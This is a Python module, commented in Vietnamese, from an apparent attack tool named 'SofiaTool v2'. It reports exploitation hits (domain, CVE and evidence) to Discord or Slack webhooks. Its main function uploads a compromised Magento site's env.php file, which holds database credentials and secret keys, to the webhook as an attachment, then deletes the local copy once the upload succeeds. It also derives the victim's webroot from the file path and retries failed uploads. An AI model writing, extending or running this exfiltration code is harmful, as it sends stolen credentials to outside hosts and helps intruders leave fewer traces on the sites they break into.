"""SofiaTool v2 — webhook báo cáo (PHA 5).

Hỗ trợ 3 format: Discord embed, Slack block, plain text line.
Format tin nhắn: Domain | cve | bằng chứng
Kèm retry(3, backoff) và ghi nhật ký gửi vào report/notify.log.

Nâng cấp file-attach:
- Khi truyền env_path (file env.php), gửi dạng multipart: payload_json (tin
  nhắn) + file (env.php) — Discord webhook hỗ trợ gửi cả hai trong 1 request.
- Sau khi webhook trả 2xx (gửi thành công) -> TỰ XOÁ file env.php để không
  lưu credential/secret lại trên máy. Gửi thất bại -> giữ file lại (không xoá).
"""
import json
import os
import time

import requests

from core import config
from core.logger import get_logger

log = get_logger()

# File upload lớn hơn bình thường -> timeout dài hơn request json thường.
FILE_TIMEOUT = 60


def webroot_from_path(path):
    """Trích webroot từ đường dẫn env.php tìm được.

    /var/www/magento/app/etc/env.php  -> /var/www/magento
    ../app/etc/env.php                -> ..  (webroot tương đối so với cwd PHP-FPM)
    app/etc/env.php                   -> .   (cwd = webroot)
    """
    if not path:
        return None
    p = str(path).rstrip("/")
    for suffix in ("/app/etc/env.php", "app/etc/env.php"):
        if p.endswith(suffix):
            root = p[: -len(suffix)].rstrip("/")
            return root or "."
    return p


def _notify_log_path():
    return os.path.join(config.REPORT_DIR, "notify.log")


def _append_notify(line):
    with open(_notify_log_path(), "a", encoding="utf-8") as f:
        f.write(line + "\n")


def _line(domain, cve, evidence, cve_first=False):
    """Chuỗi 1 dòng báo cáo.

    cve_first=False (mặc định, tương thích ngược): `domain | cve | bằng chứng`
    cve_first=True                          : `cve | domain | bằng chứng`
    (dùng cho các module yêu cầu đúng định dạng CVE | domain | bằng chứng,
    ví dụ CVE-2026-75650 StyleSmuggler.)
    """
    if cve_first:
        return f"{cve} | {domain} | {evidence}"
    return f"{domain} | {cve} | {evidence}"


# ------------------------------------------------------------------ formatters
def discord_embed(domain, cve, evidence, cve_first=False):
    return {
        "content": f"**SofiaTool v2 — HIT** `{domain}`",
        "embeds": [{
            "title": cve,
            "color": 0xE74C3C,
            "description": f"```\n{_line(domain, cve, evidence, cve_first)}\n```",
            "footer": {"text": "SofiaTool v2 | AnhKhoa"},
        }],
    }


def slack_block(domain, cve, evidence, cve_first=False):
    title = f"{cve} | {domain}" if cve_first else f"{domain} | {cve}"
    return {
        "attachments": [{
            "color": "#E74C3C",
            "title": title,
            "text": f"```\n{_line(domain, cve, evidence, cve_first)}\n```",
            "footer": "SofiaTool v2 | AnhKhoa",
        }],
    }


def plain_line(domain, cve, evidence, cve_first=False):
    return {"text": _line(domain, cve, evidence, cve_first)}


def _build(domain, cve, evidence, cve_first=False):
    fmt = config.WEBHOOK_FORMAT
    if fmt == "discord":
        return discord_embed(domain, cve, evidence, cve_first)
    if fmt == "slack":
        return slack_block(domain, cve, evidence, cve_first)
    return plain_line(domain, cve, evidence, cve_first)


# ------------------------------------------------------------- file attachment
def _post_payload(url, payload, env_path=None):
    """POST tới webhook.

    - Không có env_path (hoặc file không tồn tại): gửi JSON như cũ.
    - Có env_path: gửi multipart `payload_json` + `file` (Discord) — nhận về
      luôn file đính kèm trong cùng 1 request; Slack/plain cũng gửi kèm file.
    """
    if not env_path or not os.path.isfile(env_path):
        return requests.post(url, json=payload, timeout=10)
    with open(env_path, "rb") as f:
        files = {"file": ("env.php", f, "application/octet-stream")}
        data = {"payload_json": json.dumps(payload)}
        return requests.post(url, data=data, files=files, timeout=FILE_TIMEOUT)


def _delete_env_after_send(domain, env_path):
    """Xoá env.php sau khi webhook xác nhận 2xx. Ghi log xoá."""
    try:
        os.remove(env_path)
        log.info("[%s] env.php đã gửi webhook thành công -> tự xoá: %s",
                 domain, env_path)
        _append_notify(f"{domain} | env.php DELETED sau khi gửi OK | {env_path}")
    except OSError as e:
        log.warning("[%s] không xoá được env.php %s: %s", domain, env_path, e)
        _append_notify(f"{domain} | env.php DELETE FAILED | {env_path} | {e}")


# --------------------------------------------------------------------- sender
def send_hit(domain, cve, evidence, retries=3, env_path=None,
             cve_first=False):
    """Gửi một hit tới webhook, retry 3 lần với backoff. Trả True/False.

    Format mặc định: Domain | cve | bằng chứng
    cve_first=True : CVE | domain | bằng chứng (một số module yêu cầu, ví dụ
    CVE-2026-75650 StyleSmuggler).
    env_path (tùy chọn): đường dẫn file env.php — gửi kèm làm attachment;
    gửi thành công (2xx) thì TỰ XOÁ file env.php.
    """
    url = config.WEBHOOK_URL
    if not url:
        note = (f"{cve} | {domain} | SKIPPED (no webhook) | {evidence}"
                if cve_first
                else f"{domain} | SKIPPED (no webhook) | {evidence}")
        if env_path:
            note += f" | giữ env.php: {env_path}"
        _append_notify(note)
        return True
    payload = _build(domain, cve, evidence, cve_first)
    for attempt in range(1, retries + 1):
        try:
            r = _post_payload(url, payload, env_path)
            if r.status_code in (200, 201, 204):
                _append_notify(f"{domain} | OK (attempt {attempt}) | {evidence}")
                if env_path:
                    _delete_env_after_send(domain, env_path)
                return True
            log.warning("webhook %s -> HTTP %s (attempt %d)", url, r.status_code, attempt)
        except requests.RequestException as e:
            log.warning("webhook error: %s (attempt %d)", e, attempt)
        time.sleep(2 * attempt)
    _append_notify(f"{domain} | FAILED after {retries} attempts | {evidence}")
    log.error("webhook delivery FAILED for %s", domain)
    return False